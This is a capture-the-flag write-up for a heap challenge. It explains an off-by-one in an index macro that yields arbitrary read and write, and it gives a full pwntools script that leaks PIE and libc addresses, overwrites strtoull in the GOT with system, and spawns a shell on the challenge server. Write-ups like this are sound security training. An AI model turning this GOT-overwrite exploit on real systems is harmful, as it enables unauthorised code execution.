# Vulnerability

The program uses an allocation list to store the user input:
```c
#define SLOTS_PER_HEAP 256

struct allocation_list {
	allocation_t alloc[SLOTS_PER_HEAP];
	struct allocation_list *prev;
	struct allocation_list *next;
};
```

After analyzing the source code one can find the off by on in the `FIND_LIST` macro:
```c
#define FIND_LIST(list, idx)			\
	allocation_list_t *list = &first;	\
	while (idx > SLOTS_PER_HEAP) {		\
		if (!list) {			\
			puts("ungültige ID!");	\
			return;			\
		}				\
		list = list->next;		\
		idx -= SLOTS_PER_HEAP;		\
	}
```
If we enter an `idx` equal to 256, the while-loop exits and the following code will use the index 256 to access into the `alloc` buffer of the `allocation_list` with size 256. Since the buffer can only hold 256 elements, we have an access out of bounds and retrieve the `*prev` pointer.
```c
#define SLOTS_PER_HEAP 256

struct allocation_list {
	allocation_t alloc[SLOTS_PER_HEAP];
	struct allocation_list *prev; <---
	struct allocation_list *next;
};
```

And since `*prev` points to the `allocation_list` itself, accessing the 256th element will lead to us being able to read from and write into the first element of the `alloc` buffer. 

We can now write an arbitrary address into the first element of `alloc` buffer using `update(256)` and read from that address using `view(0, size)` and write to that address using `update(0, content)`, giving us arbitrary read and write. 

# Exploit
Since PIE is activated we first use the stack leak to leak an address from the binary. Now we read an address from the Global Offset Table to leak libc and afterwards I overwrote `strtoull` in the Global Offset Table with `system` from libc. As `strtoull` is used in the menu to process our input, we can input `/bin/sh` to get a shell.

# Solve Script
```python
from pwn import *
import warnings

warnings.filterwarnings(action='ignore', category=BytesWarning)

elf = ELF("./heapit_patched")
libc = ELF("./libc.so.6")

context.terminal = ("alacritty", "-e")
context.binary = elf

IP, PORT = "dbhchallenges.de", 30783

gdbscript = '''
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(IP, PORT)
    else:
        return elf.process()


# ----- Exploit ----- #
def create(size, content):
    p.sendline("1")
    p.sendline(str(size))
    p.sendline(content)
    p.recvline_contains(b"erfolgreich erstellt")

def view(idx, size):
    p.sendline("3")
    p.sendline(str(idx))
    p.sendline(str(size-1))
    p.recvuntil(b"du anzeigen? Inhalt: ")
    content = p.recvuntil("Optionen:").rstrip(b"Optionen:")
    return content

def update(idx, content):
    p.sendline("4")
    p.sendline(str(idx))
    p.sendline(content)
    p.recvuntil("Optionen:")

def read_qword(addr):
    update(256, p64(addr))
    leak = u64(view(0, 8))
    return leak

def write_qword(where, what):
    update(256, p64(where))
    update(0, p64(what))
   
def solve(p):
    p.recvuntil(b"It's dangerous to pwn alone. Take this: ")
    stack_leak = int(p.recvline().rstrip(b"\n").decode()[2:], 16)

    log.info(f"Leak: {hex(stack_leak)}")

    # leak pie by reading off the stack
    # I found the address on the stack via dynamic analysis using GDB
    pie_base = read_qword(stack_leak+0xe0) - 0x3dd8
    log.info(f"Pie leak: {hex(pie_base)}")
    elf.address = pie_base # set correct base to correctly determine GOT addresses in the following lines

    # leak libc by reading from GOT
    libc_base = read_qword(elf.got["strtoull"]) - 0x47520
    print(hex(elf.got["strtoull"]))
    libc.address = libc_base
    log.info(f"Libc leak: {hex(libc_base)}")

    # replace got strtoull with system from libc
    write_qword(elf.got["strtoull"], libc.symbols["system"])

    # `strtoull` is now overwritten with system@glibc
    # every menu option uses `strtoull` to parse user input, so lets go.
    p.sendline("1")
    p.sendline("/bin/sh")
    p.sendline("ls -al")
    p.recvline() # if we didnt get a shell, the program exit now
    sleep(0.2)
    p.interactive()

# We have to run the exploit multiple times since in the update() function, the lower 4 bytes of the 
# *prev pointer will be passed as size to fgets. And fgets interprets them as signed integer.
# Due to address space randomization, it can be happen that the lower 4 bytes represent a negative int.
for _ in range(10):
    p = start()
    try:
        solve(p)
    except:
        p.close()
        print("next try")

# => DBH{3v3n_5m411_bug5_4r3_c4t45tr0ph1c_1n_C._Ju57_u53_Ru57}
#                                            ^^^^^^ haha, kinda true
```
